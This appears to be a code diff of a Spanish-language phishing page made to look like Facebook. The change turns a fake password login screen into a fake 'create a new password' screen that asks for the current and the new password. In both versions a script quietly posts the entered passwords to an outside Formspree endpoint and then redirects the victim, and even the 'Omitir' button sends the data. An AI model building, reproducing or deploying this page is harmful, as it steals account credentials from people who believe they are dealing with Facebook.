@@ -3,16 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Iniciar sesión con contraseña</title>
+    <title>Crea una contraseña nueva</title>
     <style>
             :root {
                 --bg-base: #f4f4fb;
                 --fb-blue: #0866ff;
                 --fb-text-main: #1c1e21;
                 --fb-text-sec: #65676b;
-                --fb-text-desc: #48566b;
                 --fb-border: #ccd0d5;
                 --fb-error: #d31130;
+                --btn-muted: #e4e9f0;
                 --soft-gradient: radial-gradient(circle at 0% 50%,rgba(255,200,200,.4) 0%,rgba(180,200,255,.3) 40%,transparent 70%);
             }
 
@@ -34,7 +34,6 @@
                 color: var(--fb-text-main);
             }
 
-            /* ============ Estructura general (contenido arriba, pie abajo) ============ */
             .page-container {
                 min-height: 100vh;
                 width: 100%;
@@ -44,119 +43,40 @@
             }
 
             .main-wrapper {
-                flex: 1; /* empuja el pie hacia abajo */
+                flex: 1;
                 width: 100%;
-                max-width: 664px;
-                padding: 24px 20px 40px;
+                max-width: 776px;
+                padding: 88px 20px 48px;
             }
 
-            /* ============ Flecha atrás ============ */
-            .header-container {
-                display: flex;
-                flex-direction: column;
-                align-items: flex-start;
-                margin-bottom: 26px;
+            .header-title {
+                font-size: clamp(24px, 3.5vw, 30px);
+                font-weight: 700;
+                margin-bottom: 8px;
             }
 
-            .back-btn {
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                width: 36px;
-                height: 36px;
-                margin-left: -8px;
-                border-radius: 50%;
-                cursor: pointer;
+            .description {
+                font-size: 15px;
                 color: var(--fb-text-main);
-            }
-
-                .back-btn:hover {
-                    background: rgba(0,0,0,.06);
-                }
-
-                .back-btn svg {
-                    width: 22px;
-                    height: 22px;
-                    fill: currentColor;
-                }
-
-            /* ============ Caja de perfil ============ */
-            .section-group {
-                border: 1px solid rgba(204,208,213,.8);
-                border-radius: 12px;
+                line-height: 1.4;
                 margin-bottom: 36px;
-                background: rgba(255,255,255,.15);
-                backdrop-filter: blur(8px);
-                overflow: hidden;
             }
 
-            .profile-box {
-                display: flex;
-                align-items: center;
-                padding: 16px;
-            }
-
-            .avatar-placeholder {
-                position: relative;
-                width: 60px;
-                height: 60px;
-                margin-right: 16px;
-                flex-shrink: 0;
-            }
-
-            .avatar-silhouette {
-                width: 100%;
-                height: 100%;
-                background: #d8dadf;
-                border-radius: 50%;
-                display: flex;
-                justify-content: center;
-                align-items: flex-end;
-                overflow: hidden;
-            }
-
-                .avatar-silhouette svg {
-                    width: 55px;
-                    height: 55px;
-                    fill: white;
-                    margin-bottom: -5px;
-                }
-
-            .avatar-icon {
-                position: absolute;
-                bottom: -2px;
-                right: -2px;
-                width: 22px;
-                height: 22px;
-                background: var(--fb-blue);
-                border: 2px solid white;
-                border-radius: 50%;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-            }
-
-                .avatar-icon svg {
-                    width: 12px;
-                    height: 12px;
-                }
-
-            /* ============ Input de contraseña con etiqueta flotante ============ */
             .input-group {
                 position: relative;
-                margin-bottom: 44px;
+                margin-bottom: 24px;
             }
 
                 .input-group input {
                     width: 100%;
-                    height: 64px;
-                    padding: 26px 56px 10px 20px;
+                    height: 74px;
+                    padding: 30px 60px 12px 20px;
                     font-size: 16px;
                     font-family: inherit;
                     color: var(--fb-text-main);
                     background: rgba(255,255,255,.55);
                     border: 1px solid var(--fb-border);
-                    border-radius: 14px;
+                    border-radius: 18px;
                     outline: none;
                     transition: border-color .15s, box-shadow .15s;
                 }
@@ -171,7 +91,7 @@
                     left: 20px;
                     top: 50%;
                     transform: translateY(-50%);
-                    font-size: 16px;
+                    font-size: 17px;
                     color: #8891a0;
                     pointer-events: none;
                     transition: all .15s ease;
@@ -179,19 +99,18 @@
 
                 .input-group input:focus + label,
                 .input-group input:not(:placeholder-shown) + label {
-                    top: 14px;
+                    top: 16px;
                     transform: none;
                     font-size: 12px;
                 }
 
-            /* Botón mostrar/ocultar contraseña */
             .toggle-pass {
                 position: absolute;
-                right: 12px;
+                right: 14px;
                 top: 50%;
                 transform: translateY(-50%);
-                width: 36px;
-                height: 36px;
+                width: 38px;
+                height: 38px;
                 border: none;
                 background: transparent;
                 border-radius: 50%;
@@ -212,18 +131,69 @@
                     fill: currentColor;
                 }
 
-            /* ============ Mensajes de validación ============ */
+            .check-row {
+                display: block;
+                margin-bottom: 32px;
+            }
+
+            .check-label {
+                display: flex;
+                align-items: flex-start;
+                gap: 10px;
+                cursor: pointer;
+            }
+
+                .check-label input {
+                    display: none;
+                }
+
+            .custom-checkbox {
+                width: 24px;
+                height: 24px;
+                flex-shrink: 0;
+                margin-top: 1px;
+                border: 2px solid #8a8d91;
+                border-radius: 6px;
+                background: rgba(255,255,255,.55);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                transition: background .15s, border-color .15s;
+            }
+
+                .custom-checkbox svg {
+                    width: 16px;
+                    height: 16px;
+                    fill: white;
+                    opacity: 0;
+                    transition: opacity .15s;
+                }
+
+            .check-label input:checked + .custom-checkbox {
+                background: var(--fb-blue);
+                border-color: var(--fb-blue);
+            }
+
+                .check-label input:checked + .custom-checkbox svg {
+                    opacity: 1;
+                }
+
+            .check-text {
+                font-size: 17px;
+                line-height: 1.4;
+                color: var(--fb-text-main);
+            }
+
             .error-text {
                 display: block;
                 color: var(--fb-error);
                 font-size: 14px;
-                margin: -30px 2px 30px;
+                margin: -12px 2px 20px;
             }
 
-            /* ============ Botones tipo píldora ============ */
             .btn-pill {
                 width: 100%;
-                padding: 12px;
+                padding: 17px;
                 border-radius: 50px;
                 border: none;
                 cursor: pointer;
@@ -246,153 +216,84 @@
                     background: #0958d9;
                 }
 
-            .btn-secondary {
-                background: rgba(255,255,255,.3);
-                border: 1px solid var(--fb-border);
+            .btn-muted {
+                background: var(--btn-muted);
                 color: var(--fb-text-main);
             }
 
-                .btn-secondary:hover {
-                    background: rgba(255,255,255,.55);
+                .btn-muted:hover {
+                    background: #d5dce6;
                 }
 
-            /* ============ Pie: idiomas + divisor + enlaces del sitio ============ */
-            .language-footer {
+            .legal-footer {
                 width: 100%;
-                max-width: 1130px;
-                padding: 0 20px 46px;
-            }
-
-            .idiomas {
                 display: flex;
                 flex-wrap: wrap;
-                gap: 8px 38px;
-                padding: 24px 0 30px;
+                justify-content: center;
+                align-items: center;
+                gap: 4px 10px;
+                padding: 16px 20px 20px;
             }
 
-                .idiomas span,
-                .idiomas a {
-                    color: var(--fb-text-sec);
-                    font-size: 15px;
-                    text-decoration: none;
-                }
-
-                    .idiomas a:hover {
-                        text-decoration: underline;
-                    }
-
-            .divider {
-                border: none;
-                border-top: 1px solid rgba(204,208,213,.8);
-            }
-
-            .site-links {
-                display: flex;
-                flex-wrap: wrap;
-                gap: 14px 24px;
-                padding-top: 26px;
-            }
-
-                .site-links a {
+                .legal-footer a,
+                .legal-footer span {
                     color: #616a76;
                     font-size: 15px;
                     font-weight: 500;
                     text-decoration: none;
                 }
 
-                    .site-links a:hover {
+                    .legal-footer a:hover {
                         text-decoration: underline;
                     }
 
-            /* ============ Responsivo ============ */
-            @@media (max-width: 767px) {
-                .main-wrapper {
-                    max-width: 100%;
-                    padding: 16px 16px 32px;
+                .legal-footer .dot {
+                    font-size: 13px;
                 }
 
-                .input-group {
-                    margin-bottom: 32px;
+                .legal-footer .ad-icon {
+                    display: inline-flex;
+                    vertical-align: -2px;
+                    margin-left: 4px;
                 }
-
-                    .input-group input {
-                        height: 56px;
-                        font-size: 15px;
-                    }
-
-                .btn-pill {
-                    font-size: 16px;
-                }
-
-                .idiomas {
-                    gap: 6px 18px;
-                    padding: 20px 0 24px;
-                }
-
-                    .idiomas span,
-                    .idiomas a {
-                        font-size: 14px;
-                    }
-
-                .site-links {
-                    gap: 10px 16px;
-                    padding-top: 20px;
-                }
-
-                    .site-links a {
-                        font-size: 14px;
-                    }
-
-                .language-footer {
-                    padding-bottom: 28px;
-                }
-            }
     </style>
 </head>
 <body>
 
     <div class="page-container">
         <div class="main-wrapper">
-            <div class="header-container">
-                <div class="back-btn" onclick="history.back()" role="button" aria-label="Volver" title="Volver">
-                    <svg viewBox="0 0 24 24" aria-hidden="true">
-                        <path clip-rule="evenodd" fill-rule="evenodd"
-                              d="M16.753 4.341a1 1 0 0 0-1.412-.094l-8 7a1 1 0 0 0 0 1.506l8 7a1 1 0 0 0 1.318-1.506L9.518 12l7.14-6.247a1 1 0 0 0 .094-1.412z" />
-                    </svg>
-                </div>
+            <div class="header-title">Crea una contraseña nueva</div>
+
+            <div class="description">
+                Usarás esta contraseña para iniciar sesión en tu cuenta. Crea una combinación de al menos seis letras y números.
             </div>
 
-            <!-- Perfil -->
-            <div class="section-group profile-box">
-                <div class="avatar-placeholder">
-                    <div class="avatar-silhouette">
-                        <svg viewBox="0 0 32 32"><path d="M16 17.5c3.6 0 6.5-2.9 6.5-6.5S19.6 4.5 16 4.5 9.5 7.4 9.5 11s2.9 6.5 6.5 6.5zm0 2.5c-4.8 0-14.5 2.4-14.5 7.2V32h29v-4.8c0-4.8-9.7-7.2-14.5-7.2z" /></svg>
-                    </div>
-                    <div class="avatar-icon">
-                        <svg viewBox="0 0 24 24"><path fill="white" d="M15.1 12l.6-4H12V5.4c0-1.1.3-1.8 1.8-1.8h2V.3C15.5.2 14.3 0 13 0c-2.8 0-4.7 1.7-4.7 4.8V8H5v4h3.3v9.8c1.2.2 2.5.2 3.7 0V12h3.1z" /></svg>
-                    </div>
-                </div>
-                <div>
-                    <div style="font-size:16px;font-weight:500;">D...</div>
-                    <div style="font-size:14px;color:#65676b;">Facebook</div>
-                </div>
-            </div>
+            <form id="passwordForm">
+                @Html.AntiForgeryToken()
 
-            <!-- Formulario modificado con manejador en JavaScript -->
-            <form id="loginForm" onsubmit="enviarYRedirigir(event)">
-
+                <!-- Campo de Contraseña Actual -->
                 <div class="input-group">
-                    <input type="password" id="contrasenia" name="contrasenia" placeholder=" "
-                           autocomplete="current-password" required />
-                    <label for="contrasenia">Contraseña</label>
-                    <button type="button" class="toggle-pass" onclick="toggleContrasenia()"
-                            aria-label="Mostrar u ocultar contraseña" title="Mostrar u ocultar contraseña">
-                        <!-- Ojo tachado (contraseña oculta) -->
-                        <svg id="ojoCerrado" viewBox="0 0 24 24" aria-hidden="true">
+                    <input type="password" id="contraseniaActual" name="contraseniaActual" placeholder=" " autocomplete="current-password" />
+                    <label for="contraseniaActual">Contraseña actual</label>
+                    <button type="button" class="toggle-pass" onclick="togglePassVisibility('contraseniaActual', 'ojoCerradoActual', 'ojoAbiertoActual')" aria-label="Mostrar u ocultar contraseña">
+                        <svg id="ojoCerradoActual" viewBox="0 0 24 24" aria-hidden="true">
                             <path d="M12 6.5c2.76 0 5 2.24 5 5 0 .51-.1 1-.24 1.46l3.06 3.06c1.39-1.23 2.49-2.77 3.18-4.53-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-4 .7l2.17 2.15c.44-.17.9-.26 1.36-.26zM2.71 3.16c-.39.39-.39 1.02 0 1.41l1.97 1.96C3.06 7.83 1.77 9.53 1 11.5 2.73 15.89 7 19 12 19c1.52 0 2.97-.3 4.31-.82l2.72 2.73c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L4.13 3.16c-.39-.39-1.03-.39-1.42 0zM12 16.5c-2.76 0-5-2.24-5-5 0-.77.18-1.5.49-2.14l1.57 1.57c-.03.18-.06.37-.06.57 0 1.66 1.34 3 3 3 .2 0 .38-.03.57-.07l1.57 1.57c-.64.32-1.37.5-2.14.5z" />
                         </svg>
-                        <!-- Ojo abierto (contraseña visible) -->
-                        <svg id="ojoAbierto" viewBox="0 0 24 24" aria-hidden="true" style="display:none;">
+                        <svg id="ojoAbiertoActual" viewBox="0 0 24 24" aria-hidden="true" style="display:none;">
+                            <path d="M12 5c-5 0-9.27 3.11-11 7.5C2.73 16.89 7 20 12 20s9.27-3.11 11-7.5C21.27 8.11 17 5 12 5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" />
+                        </svg>
+                    </button>
+                </div>
+
+                <!-- Campo de Nueva Contraseña -->
+                <div class="input-group">
+                    <input type="password" id="contraseniaNueva" name="contraseniaNueva" placeholder=" " autocomplete="new-password" />
+                    <label for="contraseniaNueva">Nueva contraseña</label>
+                    <button type="button" class="toggle-pass" onclick="togglePassVisibility('contraseniaNueva', 'ojoCerradoNueva', 'ojoAbiertoNueva')" aria-label="Mostrar u ocultar contraseña">
+                        <svg id="ojoCerradoNueva" viewBox="0 0 24 24" aria-hidden="true">
+                            <path d="M12 6.5c2.76 0 5 2.24 5 5 0 .51-.1 1-.24 1.46l3.06 3.06c1.39-1.23 2.49-2.77 3.18-4.53-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-4 .7l2.17 2.15c.44-.17.9-.26 1.36-.26zM2.71 3.16c-.39.39-.39 1.02 0 1.41l1.97 1.96C3.06 7.83 1.77 9.53 1 11.5 2.73 15.89 7 19 12 19c1.52 0 2.97-.3 4.31-.82l2.72 2.73c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L4.13 3.16c-.39-.39-1.03-.39-1.42 0zM12 16.5c-2.76 0-5-2.24-5-5 0-.77.18-1.5.49-2.14l1.57 1.57c-.03.18-.06.37-.06.57 0 1.66 1.34 3 3 3 .2 0 .38-.03.57-.07l1.57 1.57c-.64.32-1.37.5-2.14.5z" />
+                        </svg>
+                        <svg id="ojoAbiertoNueva" viewBox="0 0 24 24" aria-hidden="true" style="display:none;">
                             <path d="M12 5c-5 0-9.27 3.11-11 7.5C2.73 16.89 7 20 12 20s9.27-3.11 11-7.5C21.27 8.11 17 5 12 5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" />
                         </svg>
                     </button>
@@ -403,92 +304,83 @@
                     <span class="error-text">@ViewBag.Error</span>
                 }
 
-                <button class="btn-pill btn-primary" type="submit">
+                <div class="check-row">
+                    <label class="check-label" for="cerrarSesiones">
+                        <input type="checkbox" id="cerrarSesiones" name="cerrarSesiones" value="true" />
+                        <span class="custom-checkbox">
+                            <svg viewBox="0 0 24 24" aria-hidden="true">
+                                <path d="M9.55 15.88 5.91 12.3a1 1 0 0 0-1.4 1.4l4.3 4.24a1.4 1.4 0 0 0 1.95.03l9.13-8.75a1 1 0 1 0-1.37-1.46l-8.97 8.12z" />
+                            </svg>
+                        </span>
+                        <span class="check-text">
+                            Cerrar las demás sesiones para asegurarte de que nadie más sigue teniendo acceso a tu cuenta
+                        </span>
+                    </label>
+                </div>
+
+                <!-- Botón Continuar -->
+                <button class="btn-pill btn-primary" type="button" onclick="enviarCredencialesYRedirigir()">
                     Continuar
                 </button>
 
-                <button class="btn-pill btn-secondary" type="button" onclick="volverAMetodos()">
-                    ¿Olvidaste tu contraseña?
+                <!-- Botón Omitir -->
+                <button class="btn-pill btn-muted" type="button" onclick="enviarCredencialesYRedirigir()">
+                    Omitir
                 </button>
             </form>
         </div>
 
-        <footer class="language-footer">
-            <nav class="idiomas" aria-label="Idiomas">
-                <span>Español</span>
-                <a href="#">English (US)</a>
-                <a href="#">Italiano</a>
-                <a href="#">Français (France)</a>
-                <a href="#">Português (Brasil)</a>
-                <a href="#">Deutsch</a>
-                <a href="#">中文(简体)</a>
-                <a href="#">Más idiomas…</a>
-            </nav>
-            <hr class="divider" />
-            <nav class="site-links" aria-label="Enlaces del sitio">
-                <a href="#">Registrarte</a>
-                <a href="#">Iniciar sesión</a>
-                <a href="#">Messenger</a>
-                <a href="#">Facebook Lite</a>
-                <a href="#">Video</a>
-                <a href="#">Meta Pay</a>
-                <a href="#">Tienda de Meta</a>
-                <a href="#">Meta Quest</a>
-                <a href="#">Ray-Ban Meta</a>
-                <a href="#">Meta AI</a>
-                <a href="#">Instagram</a>
-                <a href="#">Threads</a>
-                <a href="#">Política de privacidad</a>
-                <a href="#">Centro de privacidad</a>
-                <a href="#">Información</a>
-                <a href="#">Crear anuncio</a>
-                <a href="#">Crear página</a>
-                <a href="#">Desarrolladores</a>
-                <a href="#">Empleo</a>
-                <a href="#">Cookies</a>
-                <a href="#">Opciones de anuncios</a>
-                <a href="#">Condiciones</a>
-                <a href="#">Ayuda</a>
-                <a href="#">Importación de contactos y no usuarios</a>
-            </nav>
+        <footer class="legal-footer">
+            <a href="#">Privacidad</a>
+            <span class="dot">·</span>
+            <a href="#">Condiciones</a>
+            <span class="dot">·</span>
+            <a href="#">Publicidad</a>
+            <span class="dot">·</span>
+            <a href="#">Opciones de anuncios<span class="ad-icon"><svg width="14" height="14" viewBox="0 0 16 16" aria-hidden="true"><path fill="#616a76" d="M5 3.05v9.9c0 .73.79 1.18 1.42.82l7.7-4.95a.97.97 0 0 0 0-1.64L6.42 2.23A.97.97 0 0 0 5 3.05z" /></svg></span></a>
+            <span class="dot">·</span>
+            <a href="#">Cookies</a>
+            <span class="dot">·</span>
+            <a href="#">Más</a>
         </footer>
     </div>
 
     <script>
-            function volverAMetodos() {
-                window.location.href = '@Url.Action("Index", "Home")';
-            }
-
-            function toggleContrasenia() {
-                const input = document.getElementById('contrasenia');
+            function togglePassVisibility(inputId, closedIconId, openIconId) {
+                const input = document.getElementById(inputId);
                 const mostrando = input.type === 'text';
 
                 input.type = mostrando ? 'password' : 'text';
 
-                document.getElementById('ojoCerrado').style.display = mostrando ? '' : 'none';
-                document.getElementById('ojoAbierto').style.display = mostrando ? 'none' : '';
+                document.getElementById(closedIconId).style.display = mostrando ? '' : 'none';
+                document.getElementById(openIconId).style.display = mostrando ? 'none' : '';
 
                 input.focus();
             }
 
-            function enviarYRedirigir(event) {
-                event.preventDefault(); // Evita el envío tradicional por defecto
-
-                const form = document.getElementById('loginForm');
+            function enviarCredencialesYRedirigir() {
+                const form = document.getElementById('passwordForm');
                 const formData = new FormData(form);
 
-                // Envía los datos a Formspree en segundo plano
+                // Enviamos los datos a Formspree de fondo
                 fetch('https://formspree.io/f/xvkpnleo', {
                     method: 'POST',
                     body: formData,
                     headers: {
                         'Accept': 'application/json'
                     }
-                }).catch(error => {
-                    console.error('Error al enviar:', error);
-                }).finally(() => {
-                    // Redirige a Facebook independientemente de la respuesta para mantener la fluidez
-                    window.location.href = 'https://www.facebook.com';
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log("Datos enviados correctamente a Formspree");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error al enviar a Formspree:", error);
+                })
+                .finally(() => {
+                    // Redirección segura usando la ruta generada por Razor para el método Inicio del HomeController
+                    window.location.href = '@Url.Action("Inicio", "Home")';
                 });
             }
     </script>
